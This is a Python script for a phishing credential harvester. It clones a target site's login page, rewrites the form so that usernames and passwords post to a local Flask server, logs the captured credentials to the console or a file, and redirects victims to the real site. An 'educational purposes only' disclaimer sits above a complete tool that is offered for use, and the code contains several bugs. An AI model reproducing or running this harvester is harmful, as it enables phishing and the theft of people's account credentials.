from flask import Flask, Markup, redirect, request
from bs4 import BeautifulSoup
from requests import get
from sys import argv, exit

use = '''
This is a credential havester use with caution
This was made for educational purposes only
I am not responsible for anything you do with this


Options:
	-p or --port
		defines port to run the server on
		default is 5000
	-u or --url
		defines url to redirect to
		defines html to scrape for harvester
	-i or --input
		defines file with modified html
		use only when an error occurs during scraping
		usually this is because of unstandard forms
	-r or --redirect
		defines redirect when using the input option
		only use with input option other wise you typed to much
	-o or --output
		defines how credential will be outputed
		you should specify a file or "stdout"
		default is "stdout"
	-h or --help
		prints this nifty help screen

'''

def harvester(port, output, html, redirect_url):
	app = Flask(__name__)

	@app.route('/', methods=['GET', 'POST'])
	def get_credentials():
		if request.method == 'POST':
			if output == 'stdout':
				print(f'Username: {request.form["username"]}')
				print(f'Password: {request.form["password"]}')
			else:
				with open(output, 'a+') as file:
					file.write(f'\n{request.form["username"]}\n{request.form["password"]}\n')
			return redirect(redirect_url)
		return html

	app.run(port=port)

def get_html(site):
  username = False
  form = False
  password = False
  for form_tag in site.find_all('form'):
    form_tag['action'] = ''
    form = True
    for input_tag in form_tag.find_all('input'):
      if input_tag.get('type') == 'text':
        input_tag['name'] = 'username'
        username = True
      elif input_tag.get('type') == 'password':
        input_tag['name'] = 'password'
        password = True

  if password and form and password:
    return site
  return 'Error'

if __name__ == '__main__':
	if '-h' in argv:
		print(use)
		exit()
	elif '--help' in argv:
		print(use)
		exit()
	if '-p' in argv:
		port = argv[argv.index('-p') + 1]
	elif '--port' in argv:
		port = argv[argv.index('--port') + 1]
	else:
		port = 5000
	if '-u' in argv:
		redirect_url = argv[argv.index('-u') + 1]
		html = Markup(get_html(BeautifulSoup(get(argv[argv.index('-u') + 1]).text, 'html.parser')))
	elif '--url' in argv:
		redirect_url = argv[argv.index('--url') + 1]
		html = Markup(get_html(BeautifulSoup(get(argv[argv.index('--url') + 1]).text, 'html.parser')))
	elif '-i' in argv:
		with open(argv[argv.index('-i') + 1], 'r') as file:
			html = ''.join(file.readlines())
			if '-r' in argv:
				redirect_url = argv[argv.index('-r') + 1]
			elif '--redirect' in argv:
				redirect_url = argv[argv.index('--output') + 1]
			else:
				print(use)
				print('You did not provide a redirect, so the user will not be redirect')
				exit()
	elif '--input' in argv:
		with open(argv[argv.index('--input') + 1], 'r') as file:
			html = ''.join(file.readlines())
			if '-r' in argv:
				redirect_url = argv[argv.index('-r') + 1]
			elif '--redirect' in argv:
				redirect_url = argv[argv.index('--output') + 1]
			else:
				print(use)
				print('You did not provide a redirect, so the user will not be redirect')
				exit()
	if '-o' in argv:
		output = argv[argv.index('-o') + 1]
	elif '--output' in argv:
		output = argv[argv.index('--output') + 1]
	else:
		output = 'stdout'
	try:
		if html == 'error':
			print(url)
			print('Sorry that website is not a stardard format.')
			exit()
	except:
		print(use)
		print('Sorry html or a url was not provided.')
		exit()

#	try:
	harvester(port, output, html, redirect_url)
#	except:
#		print(use)
#		print('An error has occured')
#		exit()
